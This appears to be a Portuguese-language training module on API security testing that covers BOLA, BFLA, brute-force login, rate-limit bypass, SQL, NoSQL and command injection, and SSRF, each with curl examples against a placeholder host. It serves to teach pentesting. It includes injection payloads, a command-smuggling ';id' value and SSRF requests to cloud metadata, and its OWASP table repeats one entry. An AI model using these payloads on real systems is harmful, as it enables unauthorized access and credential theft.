# Teste de Vulnerabilidades em APIs

> BOLA, BFLA, injeção, rate limiting e outras falhas comuns em APIs.

---

## Instalação das Ferramentas

```bash
# Kiterunner
go install github.com/assetnote/kiterunner@latest

# Arjun
pip3 install arjun

# nuclei (com templates de API)
nuclei -update-templates
```

---

## OWASP API Security Top 10 (2023)

| # | Vulnerabilidade | Descrição |
|---|-----------------|-----------|
| 1 | **BOLA** | Broken Object Level Authorization |
| 2 | **BFLA** | Broken Function Level Authorization |
| 3 | **Broken Authentication** | Autenticação fraca |
| 4 | **Unrestricted Resource Consumption** | Sem rate limiting |
| 5 | **Broken Function Level Authorization** | Acesso não autorizado |
| 6 | **Unrestricted Access to Sensitive Business Flows** | Fluxos sensíveis |
| 7 | **Server Side Request Forgery (SSRF)** | SSRF via API |
| 8 | **Security Misconfiguration** | Configurações erradas |
| 9 | **Improper Inventory Management** | APIs antigas expostas |
| 10 | **Unsafe Consumption of APIs** | Consumo inseguro |

---

## BOLA (Broken Object Level Authorization)

A vulnerabilidade #1 em APIs. Acontece quando você pode acessar recursos de outros usuários alterando IDs.

### Como testar
```bash
# 1. Identificar endpoints com IDs
curl http://target.com/api/users/1
curl http://target.com/api/users/2
curl http://target.com/api/users/3

# 2. Verificar se retorna dados de outros usuários
# Se o usuário 1 retornar dados do usuário 2 = BOLA

# 3. Testar com diferentes IDs
for i in $(seq 1 100); do
  curl -s http://target.com/api/users/$i | jq '.email' 2>/dev/null
done

# 4. Testar com UUIDs
curl http://target.com/api/users/550e8400-e29b-41d4-a716-446655440000
```

### Exemplo real
```bash
# Comprimento normal
curl http://target.com/api/orders/123

# Alterar para outro ID
curl http://target.com/api/orders/124

# Se retornar pedido de outro usuário = BOLA
```

---

## BFLA (Broken Function Level Authorization)

Acesso a funções que você não deveria ter.

### Como testar
```bash
# 1. Testar endpoints de admin
curl http://target.com/api/admin/users
curl http://target.com/api/internal/config
curl http://target.com/api/debug/health

# 2. Testar métodos diferentes
curl -X DELETE http://target.com/api/users/1
curl -X PUT http://target.com/api/users/1
curl -X PATCH http://target.com/api/users/1/role

# 3. Verificar se usuários comuns podem acessar
# Se um user normal acessar /admin = BFLA
```

---

## Broken Authentication

### Como testar
```bash
# 1. Testar brute force
for i in $(seq 1 1000); do
  curl -s -X POST http://target.com/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"pass'$i'"}' | jq '.token' 2>/dev/null
done

# 2. Testar token inválido
curl -H "Authorization: Bearer invalid_token" http://target.com/api/users

# 3. Testar token expirado
curl -H "Authorization: Bearer expired_token" http://target.com/api/users

# 4. Verificar se retorna 401
# Se retornar 200 = vulnerability
```

---

## Rate Limiting

### Como testar
```bash
# 1. Enviar muitas requisições
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST http://target.com/api/login \
    -d '{"username":"admin","password":"test"}'
done

# 2. Verificar se bloqueia após X tentativas
# Se não bloquear = vulnerability

# 3. Testar bypass
curl -H "X-Forwarded-For: 1.2.3.4" http://target.com/api/login
curl -H "X-Originating-IP: 1.2.3.4" http://target.com/api/login
```

---

## Injeção em APIs

### SQL Injection
```bash
# Em parâmetros de query
curl "http://target.com/api/users?search=admin' OR 1=1--"

# Em body JSON
curl -X POST http://target.com/api/search \
  -H "Content-Type: application/json" \
  -d '{"query": "admin'\'' OR 1=1--"}'
```

### NoSQL Injection
```bash
# MongoDB injection
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# Se retornar dados = NoSQL injection
```

### Command Injection
```bash
# Em parâmetros
curl "http://target.com/api/ping?host=127.0.0.1;id"

# Em body
curl -X POST http://target.com/api/ping \
  -d '{"host": "127.0.0.1;id"}'
```

---

## SSRF via APIs

```bash
# 1. Identificar endpoints que fazem requests
curl -X POST http://target.com/api/fetch \
  -d '{"url": "http://127.0.0.1:8080"}'

# 2. Acessar serviços internos
curl -X POST http://target.com/api/fetch \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'

# 3. Listar ports internos
for port in 80 443 8080 3306 5432 6379; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST http://target.com/api/fetch \
    -d "{\"url\": \"http://127.0.0.1:$port\"}"
done
```

---

## Nuclei para APIs

```bash
# Scan de vulnerabilidades de API
nuclei -u http://target.com/api/ -t http/vulnerabilities/

# Templates específicos de API
nuclei -u http://target.com -tags api

# Scan de endpoints descobertos
cat endpoints.txt | nuclei -tags api -severity critical,high
```

---

## Lab Prático

### Exercício 1: BOLA Challenge
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/owasptop10
- **O que vai praticar:** BOLA, acesso a recursos de outros usuários
- **Tempo estimado:** 30 min

### Exercício 2: API Hacking
- **Plataforma:** PortSwigger
- **Link:** https://portswigger.net/web-security/all-labs
- **O que vai praticar:** SQL injection via API, authentication bypass
- **Tempo estimado:** 60 min

### Dica de Estudo
> BOLA é a vulnerabilidade mais comum em APIs. Sempre teste alterando IDs em endpoints que retornam dados de usuários.

---

**Anterior:** [01-reconhecimento-e-documentacao.md](01-reconhecimento-e-documentacao.md)
**Próximo:** [Módulo 12: Database Security](../12-database-security/)
